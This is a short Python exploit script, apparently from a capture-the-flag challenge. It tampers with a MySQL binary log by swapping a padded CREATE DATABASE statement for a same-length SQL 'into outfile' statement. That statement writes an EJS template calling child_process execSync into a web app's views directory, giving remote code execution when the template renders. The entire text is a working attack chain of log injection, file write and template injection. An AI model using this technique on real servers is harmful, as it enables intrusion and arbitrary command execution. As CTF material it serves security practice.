FILENAME = "/var/lib/mysql/mysql-bin.000001"


replaces = {
    b"""CREATE DATABASE if not exists AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci""":
    b"""select '<%= process.mainModule.require("child_process").execSync("/readflag").toString() %>' into outfile '/home/ezblog/views/114.ejs'""",
}


with open(FILENAME,"rb") as file:
    data = file.read()

for k, v in replaces.items():
    assert len(v) <= len(k)
    if len(v) < len(k):
        v = v.ljust(len(k), b" ")
    data = data.replace(k, v)

with open(FILENAME, "wb") as file:
    file.write(data)
